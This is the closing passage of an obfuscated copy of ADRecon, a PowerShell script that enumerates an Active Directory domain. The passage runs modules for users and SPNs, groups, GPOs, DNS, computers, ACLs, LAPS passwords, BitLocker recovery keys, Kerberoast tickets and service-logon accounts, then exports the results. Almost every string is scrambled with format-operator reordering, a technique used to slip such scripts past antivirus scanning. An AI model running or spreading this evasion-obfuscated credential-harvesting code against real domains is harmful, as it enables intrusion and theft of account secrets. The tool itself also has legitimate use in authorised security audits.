    If ($ADRDomainControllers)
    {
        Write-Output ("{2}{1}{0}{3}{6}{5}{4}" -f 'o',' D','[-]','mai','rollers','nt','n Co')
        $ADRObject = Get-ADRDomainController -Method $Method -objDomain $objDomain -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{3}{4}{1}{0}{2}" -f'n','ainCo','trollers','Do','m')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainControllers
    }
    If ($ADRUsers -or $ADRUserSPNs)
    {
        If (!$ADRUserSPNs)
        {
            Write-Output ("{2}{3}{5}{6}{1}{0}{7}{4}"-f '- May','rs ','[-','] ',' time','U','se',' take some')
            $ADRUserSPNs = $false
        }
        ElseIf (!$ADRUsers)
        {
            Write-Output ("{2}{1}{0}{3}"-f 'SP','er ','[-] Us','Ns')
            $ADRUsers = $false
        }
        Else
        {
            Write-Output ("{1}{5}{0}{3}{6}{2}{4}"-f 'y ','[-]','so','t','me time',' Users and SPNs - Ma','ake ')
        }
        Get-ADRUser -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PageSize $PageSize -Threads $Threads -ADRUsers $ADRUsers -ADRUserSPNs $ADRUserSPNs
        Remove-Variable ADRUsers
        Remove-Variable ADRUserSPNs
    }
    If ($ADRPasswordAttributes)
    {
        Write-Output ("{2}{5}{0}{3}{6}{7}{1}{4}" -f'ri','eri','[-] P','b','mental','asswordAtt','utes',' - Exp')
        $ADRObject = Get-ADRPasswordAttributes -Method $Method -objDomain $objDomain -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{3}{0}{2}"-f'ibu','PasswordA','tes','ttr')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordAttributes
    }
    If ($ADRGroups -or $ADRGroupChanges)
    {
        If (!$ADRGroupChanges)
        {
            Write-Output ("{6}{0}{1}{5}{4}{3}{2}" -f '-',' ','e',' tim','take some','May ','[-] Groups ')
            $ADRGroupChanges = $false
        }
        ElseIf (!$ADRGroups)
        {
            Write-Output ("{4}{3}{10}{1}{0}{11}{8}{7}{9}{5}{6}{2}"-f 'bership Ch','Mem','ime','o','[-] Gr','o','me t','ay','ges - M',' take s','up ','an')
            $ADRGroups = $false
        }
        Else
        {
            Write-Output ("{4}{0}{7}{1}{10}{6}{8}{11}{2}{5}{3}{9}"-f' Groups an','rship ',' take ','me t','[-]','so','ang','d Membe','es - M','ime','Ch','ay')
        }
        Get-ADRGroup -Method $Method -date $date -objDomain $objDomain -PageSize $PageSize -Threads $Threads -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRGroups $ADRGroups -ADRGroupChanges $ADRGroupChanges
        Remove-Variable ADRGroups
        Remove-Variable ADRGroupChanges
    }
    If ($ADRGroupMembers)
    {
        Write-Output ("{2}{1}{4}{7}{8}{9}{11}{0}{3}{5}{10}{6}"-f' - M','-] Grou','[','ay ','p Memb','t',' time','ers','hi','p','ake some','s')

        $ADRObject = Get-ADRGroupMember -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{2}{1}" -f 'Gr','embers','oupM')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGroupMembers
    }
    If ($ADROUs)
    {
        Write-Output (("{1}{5}{3}{6}{0}{4}{2}"-f 'onalU','[-] Or','OUs)','niza','nits (','ga','ti'))
        $ADRObject = Get-ADROU -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "OUs"
            Remove-Variable ADRObject
        }
        Remove-Variable ADROUs
    }
    If ($ADRGPOs)
    {
        Write-Output ("{1}{0}"-f '] GPOs','[-')
        $ADRObject = Get-ADRGPO -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}"-f 's','GPO')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRGPOs
    }
    If ($ADRgPLinks)
    {
        Write-Output ("{2}{0}{9}{8}{10}{6}{5}{1}{7}{4}{3}"-f 'Li',' Managemen','[-] gP','(SOM)',' ',' of','e','t','s - S','nk','cop')
        $ADRObject = Get-ADRgPLink -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{2}{0}"-f'ks','g','PLin')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRgPLinks
    }
    If ($ADRDNSZones -or $ADRDNSRecords)
    {
        If (!$ADRDNSRecords)
        {
            Write-Output ("{0}{1}{3}{2}" -f '[-] ','DNS Zo','s','ne')
            $ADRDNSRecords = $false
        }
        ElseIf (!$ADRDNSZones)
        {
            Write-Output ("{0}{4}{2}{1}{3}"-f '[',' Reco','NS','rds','-] D')
            $ADRDNSZones = $false
        }
        Else
        {
            Write-Output ("{4}{2}{0}{1}{3}" -f'Zones an','d Re','-] DNS ','cords','[')
        }
        Get-ADRDNSZone -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRDNSZones $ADRDNSZones -ADRDNSRecords $ADRDNSRecords
        Remove-Variable ADRDNSZones
    }
    If ($ADRPrinters)
    {
        Write-Output ("{3}{0}{1}{2}" -f'Pr','inte','rs','[-] ')
        $ADRObject = Get-ADRPrinter -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{2}{1}"-f'Pri','ers','nt')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPrinters
    }
    If ($ADRComputers -or $ADRComputerSPNs)
    {
        If (!$ADRComputerSPNs)
        {
            Write-Output ("{7}{5}{6}{1}{2}{3}{4}{0}"-f'ime','s',' - ','May take some ','t',' Comp','uter','[-]')
            $ADRComputerSPNs = $false
        }
        ElseIf (!$ADRComputers)
        {
            Write-Output ("{0}{3}{1}{2}" -f '[-] Comp','ter',' SPNs','u')
            $ADRComputers = $false
        }
        Else
        {
            Write-Output ("{5}{1}{2}{8}{4}{3}{7}{0}{6}" -f 'take',' Comp','ut','s - M','PN','[-]',' some time','ay ','ers and S')
        }
        Get-ADRComputer -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads -ADRComputers $ADRComputers -ADRComputerSPNs $ADRComputerSPNs
        Remove-Variable ADRComputers
        Remove-Variable ADRComputerSPNs
    }
    If ($ADRLAPS)
    {
        Write-Output ("{7}{0}{3}{6}{2}{5}{1}{4}"-f' Needs','eged Accoun','i',' ','t','l','Priv','[-] LAPS -')
        $ADRObject = Get-ADRLAPSCheck -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}"-f'L','APS')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRLAPS
    }
    If ($ADRBitLocker)
    {
        Write-Output ("{3}{0}{9}{4}{5}{2}{6}{10}{8}{7}{1}" -f 'e','Account','ry Keys - Ne','[-] BitLock','ec','ove','e',' ','eged','r R','ds Privil')
        $ADRObject = Get-ADRBitLocker -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{2}{0}{4}{3}"-f 'ecoveryK','BitLocke','rR','s','ey')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRBitLocker
    }
    If ($ADRACLs)
    {
        Write-Output ("{5}{0}{3}{1}{4}{6}{7}{2}" -f'A','ta','ime','CLs - May ','ke so','[-] ','me ','t')
        $ADRObject = Get-ADRACL -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Threads $Threads
        Remove-Variable ADRACLs
    }
    If ($ADRGPOReport)
    {
        Write-Output ("{9}{5}{7}{4}{3}{0}{8}{10}{6}{1}{2}"-f ' ta','m','e','y','t - Ma','Repo','i','r','ke so','[-] GPO','me t')
        Get-ADRGPOReport -Method $Method -UseAltCreds $UseAltCreds -ADROutputDir $ADROutputDir
        Remove-Variable ADRGPOReport
    }
    If ($ADRKerberoast)
    {
        Write-Output ("{0}{2}{1}"-f'[-] K','st','erberoa')
        $ADRObject = Get-ADRKerberoast -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}{2}" -f'ro','Kerbe','ast')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRKerberoast
    }
    If ($ADRDomainAccountsusedforServiceLogon)
    {
        Write-Output ("{9}{7}{0}{19}{4}{15}{11}{1}{12}{8}{14}{3}{10}{16}{13}{18}{5}{2}{6}{17}"-f'ount','vi','vileged A','go','d f','s Pri','ccoun','-] Domain Acc','L','[','n ',' Ser','ce ',' N','o','or','-','t','eed','s use')
        $ADRObject = Get-ADRDomainAccountsusedforServiceLogon -Method $Method -objDomain $objDomain -Credential $Credential -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{2}{3}{5}{4}" -f'DomainA','ccou','n','tsusedforSer','Logon','vice')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainAccountsusedforServiceLogon
    }

    $TotalTime = "{0:N2}" -f ((Get-DateDiff -Date1 (Get-Date) -Date2 $date)."t`Ot`AlmINuteS")

    $AboutADRecon = Get-ADRAbout -Method $Method -date $date -ADReconVersion $ADReconVersion -Credential $Credential -RanonComputer $RanonComputer -TotalTime $TotalTime

    If ( ($OutputType -Contains "CSV") -or ($OutputType -Contains "XML") -or ($OutputType -Contains ("{0}{1}" -f'JSO','N')) -or ($OutputType -Contains ("{1}{0}"-f 'TML','H')) )
    {
        If ($AboutADRecon)
        {
            Export-ADR -ADRObj $AboutADRecon -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{1}{0}{3}" -f'Reco','boutAD','A','n')
        }
        Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
        Write-Output ('[*'+'] '+'Ou'+'tput'+' '+'Dir'+'e'+'c'+'tory: '+"$ADROutputDir")
        $ADRSTDOUT = $false
    }

    Switch ($OutputType)
    {
        ("{1}{0}"-f 'TDOUT','S')
        {
            If ($ADRSTDOUT)
            {
                Write-Output "[*] Total Execution Time (mins): $($TotalTime) "
            }
        }
        ("{0}{1}"-f 'HTM','L')
        {
            Export-ADR -ADRObj $(New-Object PSObject) -ADROutputDir $ADROutputDir -OutputType $([array] ("{0}{1}" -f'HTM','L')) -ADRModuleName ("{0}{1}"-f'Ind','ex')
        }
        ("{0}{1}"-f 'EX','CEL')
        {
            Export-ADRExcel $ADROutputDir
        }
    }
    Remove-Variable TotalTime
    Remove-Variable AboutADRecon
    Set-Location $returndir
    Remove-Variable returndir

    If (($Method -eq ("{1}{0}" -f 'S','ADW')) -and $UseAltCreds)
    {
        Remove-PSDrive ADR
    }

    If ($Method -eq ("{1}{0}"-f 'DAP','L'))
    {
        $objDomain.("{0}{2}{1}"-f'D','spose','i').Invoke()
        $objDomainRootDSE.("{1}{0}"-f 'ispose','D').Invoke()
    }

    If ($ADROutputDir)
    {
        Remove-EmptyADROutputDir $ADROutputDir $OutputType
    }

    Remove-Variable ADReconVersion
    Remove-Variable RanonComputer
}

If ($Log)
{
    Start-Transcript -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

Invoke-ADRecon -GenExcel $GenExcel -Method $Method -Collect $Collect -DomainController $DomainController -Credential $Credential -OutputType $OutputType -ADROutputDir $OutputDir -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads

If ($Log)
{
    Stop-Transcript
}

